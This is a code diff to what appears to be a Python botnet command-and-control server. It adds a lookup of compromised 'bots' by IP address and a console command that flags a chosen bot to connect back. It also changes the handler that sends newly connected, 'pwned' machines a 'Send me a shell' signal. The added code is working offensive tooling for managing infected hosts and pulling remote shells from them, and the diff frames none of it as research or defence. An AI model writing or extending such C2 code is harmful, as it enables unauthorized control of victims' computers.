@@ -523,6 +523,16 @@ def help(type):
     pass
 
 
+def find_by_ip(ipaddr):
+    for bot in PingBots:
+        # addr = bot.getConn()
+        # port = bot.addr()
+        ip = bot.getip()
+        if str(ip) == str(ipaddr):
+            return bot
+    return None
+
+
 """
 Wake up dead bots, by sending "1111" to the bot.
 #TODO Fix "1111"! just use one byte!!!
@@ -539,6 +549,23 @@ def ping():
         print(sendthis)
         SR(sendthis,pingConn,1024,0)
 
+def p():
+    while True:
+        try:
+            # Get input
+            ipaddr = s_input("Pick")
+            # If it's exit get out
+            if ipaddr == 'exit':
+                return
+
+            bot = find_by_ip(ipaddr)
+            bot.setConnectToME(1)
+        except KeyboardInterrupt:
+            return
+        except:
+            print("Error in C2AHandler")
+            return
+
 """
 Console 
 """
@@ -553,6 +580,9 @@ def console():
         if len(bot) >= 2:
             talk(bot)
             continue
+        elif Command == "p":
+            pass
+            p()
         elif Command == "1":
             pass
             #sendMeShells(1)
@@ -608,11 +638,15 @@ def pingSockFun(consoleT,pingSock):
             # In case this ip is already pwned
             bot = find_PingBot_Replace(ipAddress, pingConn, pingAddr)
 
+
+            # This case is when it connects for the first time.
             if bot == None:
                 # Send me a shell
                 SR("111111\n\0",pingConn,1024,0)
                 # Add it to the list to keep track of the flow.
-                PingBots.append(Bot(pingConn, pingAddr))
+                bot = Bot(pingConn, pingAddr)
+                bot.setConnectToME(0)
+                PingBots.append(bot)
 
             elif bot != None and bot.getConnectToME() == 1:
                 # Send me a shell
